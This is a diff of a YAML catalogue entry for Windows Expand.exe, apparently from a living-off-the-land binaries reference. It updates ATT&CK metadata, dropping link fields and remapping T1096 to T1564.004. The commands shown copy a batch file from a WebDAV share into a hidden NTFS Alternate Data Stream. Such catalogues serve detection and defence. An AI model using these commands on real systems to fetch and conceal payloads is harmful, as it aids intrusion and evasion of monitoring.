@@ -10,7 +10,6 @@ Commands:
     Category: Download
     Privileges: User
     MitreID: T1105
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1105
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
   - Command: expand c:\ADS\file1.bat c:\ADS\file2.bat
     Description: Copies source file to destination.
@@ -18,15 +17,13 @@ Commands:
     Category: Copy
     Privileges: User
     MitreID: T1105
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1105
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
   - Command: expand \\webdav\folder\file.bat c:\ADS\file.txt:file.bat
     Description: Copies source file to destination Alternate Data Stream (ADS)
     Usecase: Copies files from A to B
     Category: ADS
     Privileges: User
-    MitreID: T1096
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1096
+    MitreID: T1564.004
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
 Full_Path:
   - Path: C:\Windows\System32\Expand.exe
